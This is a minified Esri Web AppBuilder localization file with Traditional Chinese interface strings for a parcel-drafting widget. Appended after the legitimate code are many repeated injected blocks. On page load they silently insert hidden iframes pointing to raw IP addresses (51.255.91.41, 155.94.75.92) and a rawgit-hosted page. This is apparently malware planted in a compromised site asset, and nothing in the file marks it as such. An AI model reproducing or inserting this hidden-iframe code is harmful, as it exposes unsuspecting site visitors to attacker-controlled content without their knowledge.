// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/ParcelDrafter/nls/strings":{_widgetLabel:"\u5b97\u5730\u8349\u7a3f",newTraverseButtonLabel:"\u555f\u52d5\u65b0\u884c\u7a0b",invalidConfigMsg:"\u8a2d\u5b9a\u7121\u6548",geometryServiceURLNotFoundMSG:"\u7121\u6cd5\u53d6\u5f97\u5e7e\u4f55\u670d\u52d9 URL",editTraverseButtonLabel:"\u7de8\u8f2f\u884c\u7a0b",mapTooltipForStartNewTraverse:"\u8acb\u9078\u64c7\u5730\u5716\u4e0a\u7684\u9ede\u6216\u5728\u4e0b\u65b9\u8f38\u5165\u4ee5\u958b\u59cb\u57f7\u884c",mapTooltipForEditNewTraverse:"\u8acb\u9078\u64c7\u8981\u7de8\u8f2f\u7684\u5b97\u5730",
mapTooltipForUpdateStartPoint:"\u6309\u4e00\u4e0b\u4ee5\u66f4\u65b0\u8d77\u9ede",mapTooltipForScreenDigitization:"\u6309\u4e00\u4e0b\u4ee5\u65b0\u589e\u5b97\u5730\u9ede",mapTooltipForRotate:"\u62d6\u66f3\u65cb\u8f49",mapTooltipForScale:"\u62d6\u66f3\u4ee5\u8abf\u6574",backButtonTooltip:"\u8fd4\u56de",newTraverseTitle:"\u65b0\u589e\u884c\u7a0b",editTraverseTitle:"\u7de8\u8f2f\u884c\u7a0b",clearingDataConfirmationMessage:"\u8b8a\u66f4\u5c07\u6368\u68c4\uff0c\u8981\u5426\u8981\u7e7c\u7e8c?",unableToFetchParcelMessage:"\u7121\u6cd5\u64f7\u53d6\u5b97\u5730\u3002",
unableToFetchParcelLinesMessage:"\u7121\u6cd5\u64f7\u53d6\u5b97\u5730\u7dda\u3002",planSettings:{planSettingsTitle:"\u8a2d\u5b9a",directionOrAngleTypeLabel:"\u65b9\u5411\u6216\u89d2\u5ea6\u985e\u578b",directionOrAngleUnitsLabel:"\u65b9\u5411\u6216\u89d2\u5ea6\u55ae\u4f4d",distanceAndLengthUnitsLabel:"\u8ddd\u96e2\u548c\u9577\u5ea6\u55ae\u4f4d",areaUnitsLabel:"\u9762\u7a4d\u55ae\u4f4d",circularCurveParameters:"\u5713\u66f2\u7dda\u53c3\u6578",northAzimuth:"\u5317\u5411\u65b9\u4f4d\u89d2",southAzimuth:"\u5357\u5411\u65b9\u4f4d\u89d2",
quadrantBearing:"\u8c61\u9650\u65b9\u4f4d",radiusAndChordLength:"\u534a\u5f91\u548c\u5f26\u9577",radiusAndArcLength:"\u534a\u5f91\u548c\u5f27\u9577",expandGridTooltipText:"\u5c55\u958b\u65b9\u683c",collapseGridTooltipText:"\u6536\u5408\u65b9\u683c",zoomToLocationTooltipText:"\u7e2e\u653e\u81f3\u4f4d\u7f6e",onScreenDigitizationTooltipText:"\u6578\u5b57\u5316"},traverseSettings:{bearingLabel:"\u65b9\u4f4d",lengthLabel:"\u9577\u5ea6",radiusLabel:"\u534a\u5f91",noMiscloseCalculated:"\u672a\u8a08\u7b97\u4e0d\u9589\u5408",
traverseMiscloseBearing:"\u4e0d\u9589\u5408\u65b9\u4f4d",traverseAccuracy:"\u6e96\u78ba\u6027",accuracyHigh:"\u9ad8",traverseDistance:"\u4e0d\u9589\u5408\u8ddd\u96e2",traverseMiscloseRatio:"\u4e0d\u9589\u5408\u6bd4\u7387",traverseStatedArea:"\u898f\u5b9a\u7684\u9762\u7a4d",traverseCalculatedArea:"\u8a08\u7b97\u7684\u9762\u7a4d",addButtonTitle:"\u65b0\u589e",deleteButtonTitle:"\u79fb\u9664"},parcelTools:{rotationToolLabel:"\u89d2\u5ea6",scaleToolLabel:"\u6bd4\u4f8b"},newTraverse:{invalidBearingMessage:"\u65b9\u4f4d\u7121\u6548\u3002",
invalidLengthMessage:"\u9577\u5ea6\u7121\u6548\u3002",invalidRadiusMessage:"\u534a\u5f91\u7121\u6548\u3002",negativeLengthMessage:"\u50c5\u5c0d\u66f2\u7dda\u6709\u6548",enterValidValuesMessage:"\u8acb\u8f38\u5165\u6709\u6548\u503c\u3002",enterValidParcelInfoMessage:"\u8acb\u8f38\u5165\u8981\u5132\u5b58\u7684\u90e8\u5206\u6709\u6548\u7684\u5b97\u5730\u8cc7\u8a0a\u3002",unableToDrawLineMessage:"\u7121\u6cd5\u7e6a\u88fd\u7dda\u689d\u3002",invalidEndPointMessage:"\u7aef\u9ede\u7121\u6548\uff0c\u7121\u6cd5\u7e6a\u88fd\u7dda\u689d\u3002"},
planInfo:{requiredText:"(\u5fc5\u586b)",optionalText:"(\u53ef\u9078)",parcelNamePlaceholderText:"\u5b97\u5730\u540d\u7a31",parcelDocumentTypeText:"\u6587\u4ef6\u985e\u578b",planNamePlaceholderText:"\u8a08\u756b\u540d\u7a31",cancelButtonLabel:"\u53d6\u6d88",saveButtonLabel:"\u5132\u5b58",saveNonClosedParcelConfirmationMessage:"\u8f38\u5165\u7684\u5b97\u5730\u672a\u5c01\u9589\uff0c\u662f\u5426\u4ecd\u8981\u7e7c\u7e8c\u4e26\u50c5\u5132\u5b58\u5b97\u5730\u7dda?",unableToCreatePolygonParcel:"\u7121\u6cd5\u5efa\u7acb\u5b97\u5730\u591a\u908a\u5f62\u3002",
unableToSavePolygonParcel:"\u7121\u6cd5\u5132\u5b58\u5b97\u5730\u591a\u908a\u5f62\u3002",unableToSaveParcelLines:"\u7121\u6cd5\u5132\u5b58\u5b97\u5730\u7dda\u3002",unableToUpdateParcelLines:"\u7121\u6cd5\u66f4\u65b0\u5b97\u5730\u7dda\u3002",parcelSavedSuccessMessage:"\u5df2\u6210\u529f\u5132\u5b58\u5b97\u5730\u3002",enterValidParcelNameMessage:"\u8acb\u8f38\u5165\u6709\u6548\u7684\u5b97\u5730\u540d\u7a31\u3002",enterValidPlanNameMessage:"\u8acb\u8f38\u5165\u6709\u6548\u7684\u8a08\u756b\u540d\u7a31\u3002",
enterValidDocumentTypeMessage:"\u6587\u4ef6\u985e\u578b\u7121\u6548\u3002",enterValidStatedAreaNameMessage:"\u8acb\u8f38\u5165\u6709\u6548\u7684\u898f\u5b9a\u9762\u7a4d\u3002"},xyInput:{explanation:"\u5728\u5b97\u5730\u5716\u5c64\u7684\u7a7a\u9593\u53c3\u8003\u4e2d"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});